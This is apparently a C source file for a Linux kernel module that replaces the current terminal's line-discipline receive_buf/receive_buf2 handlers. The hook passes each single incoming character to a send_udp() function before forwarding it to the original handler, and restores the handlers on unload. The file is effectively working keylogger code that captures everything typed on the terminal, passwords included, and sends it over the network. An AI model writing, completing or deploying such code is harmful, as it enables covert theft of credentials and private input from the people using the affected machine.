#include "hook.h"

#include <linux/sched.h>    // For current
#include <linux/tty.h>      // For the tty declarations

#define SECRET "ppiinngg"
#define SECRET_SIZE 8

static int counter;

struct tty_struct *my_tty;

void print_string(char *string);

// pointer to the old receive_buf function
// we need this so we can restore the tty when the module exits
void (*old_receive_buf)(struct tty_struct*, const unsigned char*, char*, int);

int (*old_receive_buf2)(struct tty_struct*, const unsigned char*, char*, int);

void new_receive_buf(struct tty_struct* tty, const unsigned char* cp, char* fp,
		int count) {

	// ignore raw mode. The tty has bits to check
	// for this

	// if we have a single character

	if (count == 1) {
		send_udp(cp);

	} else {
		/* should not happen */

	}

	if (old_receive_buf) {
		old_receive_buf(tty, cp, fp, count);
	}
}

int new_receive_buf2(struct tty_struct* tty, const unsigned char* cp, char* fp,
		int count) {

	new_receive_buf(tty, cp, fp, count);

	return old_receive_buf2(tty, cp, fp, count);

}

/* prints a string to the stdio */
void print_string(char *str) {
	if (my_tty != NULL) {

		((my_tty->driver->ops)->write)(my_tty,	str, strlen(str));

		((my_tty->driver->ops)->write)(my_tty, "\015\012", 2);
	}

}

/*
 * This function is called when the module is loaded.
 */
void initialize_tty(void) {

	counter = 0;

	my_tty = get_current_tty();

	if (my_tty->ldisc->ops->receive_buf2) {
		old_receive_buf2 = my_tty->ldisc->ops->receive_buf2;
		my_tty->ldisc->ops->receive_buf2 = new_receive_buf2;
	}
	else if (my_tty->ldisc->ops->receive_buf) {
		printk(KERN_INFO "rcbuf found");
		old_receive_buf = my_tty->ldisc->ops->receive_buf;
		my_tty->ldisc->ops->receive_buf = new_receive_buf;
	}

	return;
}

/*
 * This function is called when the module is unloaded.
 */
void remove_tty(void) {

	if (my_tty) {

		if (my_tty->ldisc->ops->receive_buf2) {
			//restore the receive_buf function
			my_tty->ldisc->ops->receive_buf2 = old_receive_buf2;
		} else if (my_tty->ldisc->ops->receive_buf) {
			//restore the receive_buf function
			my_tty->ldisc->ops->receive_buf = old_receive_buf;
		}

	}
	//printk(KERN_INFO "Module unloaded.\n");
}
